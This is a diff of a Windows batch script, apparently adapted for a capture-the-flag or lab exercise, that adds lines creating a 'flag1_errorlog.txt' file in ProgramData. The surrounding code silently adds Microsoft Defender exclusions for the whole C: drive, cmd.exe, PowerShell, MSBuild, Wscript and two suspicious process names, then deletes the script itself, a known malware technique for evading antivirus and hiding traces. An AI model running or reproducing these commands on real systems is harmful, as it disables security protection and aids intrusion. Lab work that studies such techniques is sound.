@@ -6,6 +6,9 @@ if %errorlevel% == 0 (
     rem Add exclusions for specified paths and processes
     powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue" >nul 2>&1
 
+    rem Create the flag file in ProgramData
+    echo. > "%ProgramData%\flag1_errorlog.txt"
+    
     rem Delete the batch script itself after execution
     del "%~f0" >nul 2>&1
 
@@ -26,6 +29,9 @@ if %errorlevel% == 0 (
     rem Add exclusions for specified paths and processes
     powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue" >nul 2>&1
 
+    rem Create the flag file in ProgramData
+    echo. > "%ProgramData%\flag1_errorlog.txt"
+    
     rem Delete the batch script itself after execution
     del "%~f0" >nul 2>&1
 
